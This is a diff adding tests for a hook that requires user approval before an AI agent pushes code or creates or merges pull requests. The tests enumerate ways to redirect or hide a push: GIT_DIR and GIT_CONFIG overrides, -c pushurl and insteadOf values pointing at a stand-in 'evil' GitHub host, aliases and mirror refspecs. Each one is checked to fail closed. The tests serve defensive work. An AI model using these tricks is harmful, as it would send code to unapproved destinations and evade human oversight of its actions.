@@ -1353,7 +1353,10 @@ test('#305: shipTargets reads the repo and branch each gated call ships', () => 
     `git -C ${SHIP} push`,
     'gh pr create --fill',
     'gh pr create --head feat/x -R O/R --title "a b"',
-    'gh pr create --head=me:feat/x --repo=o/r',
+    'gh pr create --head=o:feat/x --repo=o/r',
+    'git push --no-follow-tags --recurse-submodules=check origin feat/x',
+    'git push --recurse-submodules=no origin feat/x',
+    'git -c core.quotepath=false push origin feat/x',
     'gh pr merge --rebase',
     'gh pr merge feat/x --squash -R github.com/o/r',
     'gh pr merge 12 --rebase --body "x y"',
@@ -1375,6 +1378,122 @@ test('#305: shipTargets reads the repo and branch each gated call ships', () => 
   assert.deepEqual(T('git push origin feat/x:HEAD'), ['!git push']);
   assert.deepEqual(T('git push --dry-run origin'), []);
   assert.deepEqual(T('git push origin feat/x && gh pr view 12'), [X]);
+});
+
+// ---- #305 review: anything the guard can't read with certainty fails closed ----
+// A bound approval allows repeated pushes, so a target read wrong would turn one
+// answer into unlimited pushes anywhere.
+
+/** shipTargets' verdict per command: the targets, or `!why` for an unreadable one. */
+const targetsIn = (cmd, cwd = SHIP) => shipTargets(cmd, cwd, null, { prHead }).map((x) => x.target ?? `!${x.why}`);
+const unreadable = (cmd, cwd = SHIP) => assert.ok(targetsIn(cmd, cwd).some((t) => t.startsWith('!')), `${cmd} → ${JSON.stringify(targetsIn(cmd, cwd))}`);
+
+/** A ship repo with extra config: [key, value] pairs, each added (`--add`). */
+function cfgRepo(pairs, branch = 'feat/x') {
+  const dir = shipRepo(branch);
+  for (const [k, v] of pairs) execFileSync('git', ['-C', dir, 'config', '--add', k, v]);
+  return dir;
+}
+
+test('#305 review 1: a matching refspec (`:`, `+:`) blocks and binds nothing', () => {
+  const { h, stateFile } = pushGateTmp();
+  const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
+  for (const cmd of ['git push origin :', 'git push origin +:', 'git push origin feat/x :']) {
+    assert.match(pushGateReason(cmd, SHIP, t, stateFile) || '', /can't tell which branch/, cmd);
+  }
+  assert.equal(pushGateReason('git push origin feat/b', SHIP, t, stateFile), null);
+  assert.ok(pushGateReason('git push origin main', SHIP, t, stateFile));
+  assert.ok(pushGateReason('git push origin feat/b :', SHIP, t, stateFile));
+});
+
+test('#305 review 2: git dir, work tree and config overrides on the command line fail closed', () => {
+  for (const cmd of [
+    'GIT_DIR=/x/.git git push origin feat/x',
+    'env GIT_DIR=/x/.git git push origin feat/x',
+    'export GIT_DIR=/x/.git; git push origin feat/x',
+    'GIT_WORK_TREE=/x git push origin feat/x',
+    'export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=https://github.com/evil/x; git push origin feat/x',
+    "GIT_CONFIG_PARAMETERS=\"'remote.origin.pushurl'='x'\" git push origin feat/x",
+    "$env:GIT_DIR = 'x'; git push origin feat/x",
+    'env -C /x git push origin feat/x',
+    'env --chdir=/x git push origin feat/x',
+    'git --git-dir=/x/.git push origin feat/x',
+    'git --git-dir /x/.git push origin feat/x',
+    'git --work-tree=/x push origin feat/x',
+    'git --config-env=remote.origin.pushurl=EVIL push origin feat/x',
+    'git -c remote.origin.pushurl=https://github.com/evil/x.git push origin feat/x',
+    'git -c push.default=matching push',
+    'git -c url.https://github.com/evil/.pushInsteadOf=https://github.com/o/ push origin feat/x',
+    'git -c branch.feat/x.merge=refs/heads/main push',
+    'git -c Remote.origin.push=refs/heads/feat/x:refs/heads/main push origin feat/x',
+    'git -c alias.p=push p origin main',
+    'GIT_DIR=/x/.git gh pr merge feat/x',
+  ]) {
+    unreadable(cmd);
+  }
+  // A -c alias call is gated even though its subcommand isn't push.
+  const { h, stateFile } = pushGateTmp();
+  assert.ok(pushGateReason('git -c alias.p=push p origin main', SHIP, join(h, 'none.jsonl'), stateFile));
+});
+
+test('#305 review 3: push config that could send the push elsewhere fails closed; the last value wins', () => {
+  const bare = [
+    [['push.default', 'upstream']],
+    [['push.default', 'tracking']],
+    [['push.default', 'matching']],
+    [['branch.feat/x.merge', 'refs/heads/main']],
+  ];
+  for (const pairs of bare) {
+    unreadable('git push', cfgRepo(pairs));
+    unreadable('git push origin', cfgRepo(pairs));
+  }
+  // An explicit <remote> <branch> is unaffected by push.default and upstream config.
+  assert.deepEqual(targetsIn('git push origin feat/x', cfgRepo([['push.default', 'matching'], ['branch.feat/x.merge', 'refs/heads/main']])), ['github.com/o/r#feat/x']);
+  for (const pairs of [
+    [['remote.origin.push', 'refs/heads/feat/x:refs/heads/main']],
+    [['remote.origin.mirror', 'true']],
+    [['remote.origin.pushurl', 'https://github.com/o/r.git'], ['remote.origin.pushurl', 'https://github.com/evil/x.git']],
+    [['remote.origin.url', 'https://github.com/evil/x.git']], // a second url: push goes to both
+    [['url.https://github.com/evil/.pushInsteadOf', 'https://github.com/o/']],
+    [['url.https://github.com/evil/.insteadOf', 'https://github.com/o/']],
+    [['push.followTags', 'true']],
+    [['push.recurseSubmodules', 'on-demand']],
+  ]) {
+    unreadable('git push origin feat/x', cfgRepo(pairs));
+  }
+  // The last value wins, as in git: push.default back to simple passes ...
+  assert.deepEqual(targetsIn('git push', cfgRepo([['push.default', 'matching'], ['push.default', 'simple'], ['branch.feat/x.merge', 'refs/heads/feat/x']])), ['github.com/o/r#feat/x']);
+  // ... and a bare push goes to the last branch.<b>.remote.
+  const forked = cfgRepo([['remote.fork.url', 'https://github.com/o/fork.git'], ['branch.feat/x.remote', 'origin'], ['branch.feat/x.remote', 'fork']]);
+  assert.deepEqual(targetsIn('git push', forked), ['github.com/o/fork#feat/x']);
+});
+
+test('#305 review 4: --follow-tags and --recurse-submodules (but =no/check) fail closed', () => {
+  for (const cmd of ['git push --follow-tags origin feat/x', 'git push --recurse-submodules=on-demand origin feat/x', 'git push --recurse-submodules=only origin feat/x', 'git push --recurse-submodules origin feat/x']) {
+    unreadable(cmd);
+  }
+});
+
+test('#305 review 5: gh pr create -H owner:branch keeps the owner, and another owner blocks', () => {
+  unreadable('gh pr create -H someone:feat/x');
+  unreadable('gh pr create --head=evil:feat/x -R o/r');
+  assert.deepEqual(targetsIn('gh pr create -H O:feat/x'), ['github.com/o/r#feat/x']);
+});
+
+test('#305 review 7: gh pr merge --auto does not use the approval up', () => {
+  const { h, stateFile } = pushGateTmp();
+  const t = transcriptWith(h, { 'Ship it?': 'Push + open PR' });
+  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null);
+  assert.equal(pushGateReason('gh pr merge --auto --rebase', SHIP, t, stateFile), null);
+  assert.equal(pushGateReason('git push', SHIP, t, stateFile), null, 'a CI-fix push after --auto');
+  assert.equal(pushGateReason('gh pr merge --disable-auto', SHIP, t, stateFile), null);
+  assert.equal(pushGateReason('gh pr merge --rebase', SHIP, t, stateFile), null);
+  assert.match(pushGateReason('git push', SHIP, t, stateFile) || '', /merged/);
+});
+
+test('#305 review 8: the block quotes the current CLAUDE.md approval rule', () => {
+  const { h, stateFile } = pushGateTmp();
+  assert.match(pushGateReason('git push', SHIP, join(h, 'none.jsonl'), stateFile) || '', /Push, PR create, PR merge need explicit user approval \(hook-gated\); commits need none\./);
 });
 
 test('the latest answer blocks even when an older answer in the same transcript approved', () => {
